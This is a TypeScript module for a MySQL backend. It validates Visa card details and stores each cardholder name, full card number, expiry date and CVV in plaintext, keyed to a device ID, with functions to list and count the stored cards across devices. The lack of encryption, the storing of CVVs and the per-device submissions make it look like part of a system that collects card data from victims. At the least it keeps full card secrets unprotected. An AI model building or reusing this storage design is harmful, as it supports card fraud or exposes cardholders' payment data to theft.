import type { RowDataPacket } from "mysql2";
import { v4 as uuidv4 } from "uuid";
import { pool } from "../db/pool.js";

interface VisaAccountRow extends RowDataPacket {
  id: string;
  device_id: string;
  card_holder: string;
  card_number: string;
  expiry: string;
  cvv: string;
  amount: string | null;
  submitted_at: Date;
  created_at: Date;
  updated_at: Date;
}

export interface VisaAccountInput {
  cardHolder: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  amount?: string | null;
  submittedAt?: number;
}

export interface VisaAccountRecord {
  id: string;
  deviceId: string;
  cardHolder: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  amount: string | null;
  submittedAt: Date;
  createdAt: Date;
  updatedAt: Date;
}

function mapVisaAccount(row: VisaAccountRow): VisaAccountRecord {
  return {
    id: row.id,
    deviceId: row.device_id,
    cardHolder: row.card_holder,
    cardNumber: row.card_number,
    expiry: row.expiry,
    cvv: row.cvv,
    amount: row.amount,
    submittedAt: row.submitted_at,
    createdAt: row.created_at,
    updatedAt: row.updated_at,
  };
}

function normalizeCardNumber(cardNumber: string): string {
  return cardNumber.replace(/\s+/g, "");
}

function validateVisaInput(input: VisaAccountInput) {
  const cardHolder = input.cardHolder.trim();
  const cardNumber = normalizeCardNumber(input.cardNumber);
  const expiry = input.expiry.trim();
  const cvv = input.cvv.trim();

  if (!cardHolder) {
    throw new Error("visa_card_holder_required");
  }
  if (cardNumber.length < 13 || cardNumber.length > 19 || !cardNumber.startsWith("4")) {
    throw new Error("visa_card_number_invalid");
  }
  if (!/^\d+$/.test(cardNumber)) {
    throw new Error("visa_card_number_invalid");
  }

  const expiryParts = expiry.split("/");
  if (expiryParts.length !== 2) {
    throw new Error("visa_expiry_invalid");
  }
  const month = Number(expiryParts[0]);
  const year = Number(expiryParts[1]);
  if (!Number.isInteger(month) || month < 1 || month > 12) {
    throw new Error("visa_expiry_invalid");
  }
  if (!Number.isInteger(year) || year < 0) {
    throw new Error("visa_expiry_invalid");
  }

  if (cvv.length < 3 || cvv.length > 4 || !/^\d+$/.test(cvv)) {
    throw new Error("visa_cvv_invalid");
  }

  return {
    cardHolder,
    cardNumber,
    expiry,
    cvv,
    amount: input.amount?.trim() || null,
    submittedAt: input.submittedAt ? new Date(input.submittedAt) : new Date(),
  };
}

export async function createVisaAccount(
  deviceId: string,
  input: VisaAccountInput,
): Promise<VisaAccountRecord> {
  const normalized = validateVisaInput(input);
  const id = uuidv4();

  await pool.query(
    `INSERT INTO device_visa_accounts
      (id, device_id, card_holder, card_number, expiry, cvv, amount, submitted_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
    [
      id,
      deviceId,
      normalized.cardHolder,
      normalized.cardNumber,
      normalized.expiry,
      normalized.cvv,
      normalized.amount,
      normalized.submittedAt,
    ],
  );

  const record = await getVisaAccountById(id);
  if (!record) {
    throw new Error("visa_account_save_failed");
  }
  return record;
}

export async function getVisaAccountById(id: string): Promise<VisaAccountRecord | null> {
  const [rows] = await pool.query<VisaAccountRow[]>(
    "SELECT * FROM device_visa_accounts WHERE id = ? LIMIT 1",
    [id],
  );
  const row = rows[0];
  return row ? mapVisaAccount(row) : null;
}

export async function listVisaAccounts(options: {
  deviceId?: string;
  limit?: number;
}): Promise<VisaAccountRecord[]> {
  const limit = Math.min(Math.max(options.limit ?? 100, 1), 500);
  const where: string[] = [];
  const params: unknown[] = [];

  if (options.deviceId?.trim()) {
    where.push("device_id = ?");
    params.push(options.deviceId.trim());
  }

  const whereSql = where.length > 0 ? `WHERE ${where.join(" AND ")}` : "";
  const [rows] = await pool.query<VisaAccountRow[]>(
    `SELECT * FROM device_visa_accounts
     ${whereSql}
     ORDER BY submitted_at DESC
     LIMIT ?`,
    [...params, limit],
  );

  return rows.map(mapVisaAccount);
}

export async function countVisaAccounts(deviceId: string): Promise<number> {
  const id = deviceId.trim();
  if (!id) {
    return 0;
  }
  const [rows] = await pool.query<RowDataPacket[]>(
    "SELECT COUNT(1) AS cnt FROM device_visa_accounts WHERE device_id = ?",
    [id],
  );
  return Number(rows[0]?.cnt ?? 0);
}
